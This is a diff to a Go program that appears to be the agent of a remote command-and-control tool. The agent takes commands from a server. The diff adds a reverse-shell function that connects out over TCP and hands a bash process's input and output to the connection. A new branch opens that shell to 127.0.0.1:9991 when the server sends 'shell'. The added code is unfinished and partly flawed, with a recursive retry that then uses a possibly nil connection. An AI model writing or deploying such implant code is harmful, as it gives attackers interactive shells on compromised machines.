@@ -1,19 +1,19 @@
 package main
 
 import (
-	"encoding/gob"
-	"fmt"
-	"log"
-	"math/rand"
-	"net"
-	"os"
-	"os/exec"
-	"runtime"
-	"strconv"
-	"time"
+    "encoding/gob"
+    "fmt"
+    "log"
+    "math/rand"
+    "net"
+    "os"
+    "os/exec"
+    "runtime"
+    "strconv"
+    "time"
     "bytes"
     "encoding/json"
-	"github.com/google/uuid"
+    "github.com/google/uuid"
     "net/http"
 )
 
@@ -147,6 +147,23 @@ func respondToServer(command, result string) error {
     return nil
 }
 
+func reverse(host string) {
+    for {
+        c, err := net.Dial("tcp", host)
+        if nil != err {
+            if nil != c {
+                c.Close()
+            }
+            time.Sleep(time.Minute)
+            reverse(host)
+        }
+
+        cmd := exec.Command("/usr/bin/bash")
+        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+        cmd.Run()
+        c.Close()
+    }
+}
 
 // Function that recieves commands from server
 func getCommands(client Client, clientSocket net.Listener) error {
@@ -166,15 +183,11 @@ func getCommands(client Client, clientSocket net.Listener) error {
             return err
         }
 
-        // Executes command
-        command := string(serverCommand[:serverCommandLen])
-        out, err := exec.Command(command).Output()
-
-        if err != nil {
-            log.Fatal(err)
+        // TODO: I was here
+        if string(serverCommand[:serverCommandLen]) == "shell" {
+            reverse("127.0.0.1:9991")
         }
 
-        respondToServer(command, string(out))
     }
 }
 
